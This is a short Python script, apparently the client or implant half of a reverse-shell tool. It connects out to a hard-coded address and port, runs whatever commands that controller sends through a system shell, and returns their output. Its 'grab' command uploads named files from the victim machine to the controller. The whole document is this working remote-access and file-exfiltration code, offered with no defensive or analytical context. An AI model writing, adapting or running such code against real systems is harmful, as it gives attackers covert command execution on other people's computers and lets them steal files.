#Client

import socket       #For building TCP Connection
import subprocess   #To start he shell in the system

def transfer(s,path):
    if os.path.exists(path):    #Checking if the path exists in client computer
        f=open(path,'rb')       
        packet=f.read(1024)     #Reading 1KB from the file
        while packet!='':   
            s.send(packet)      #Sending 1KB to server side
            packet=f.read(1024)
        s.send('DONE')
        f.close()
    else:           #If File not Found
        s.send('Unable to find out the file')
        
def connect():

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.10.10",8080))   #Specify the IP address and Port number

    while True:
        command=s.recv(1024)      #Receiving 1Mb of data

        if 'terminate' in command:
            s.close() #Close the socket
            break
            
        elif 'grab' in command:   #grab*C:\Users\file-name
            grab,path=command.split('*')      
            try:
                transfer(s,path)
            except Exception,e:
                s.send(str(e))
                pass
            
        else:
            CMD=subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)  #Starting the shell
            s.send(CMD.stdout.read())  #Send the result
            s.send(CMD.stderr.read())  #Exception Handling

def main():
    connect()
main()
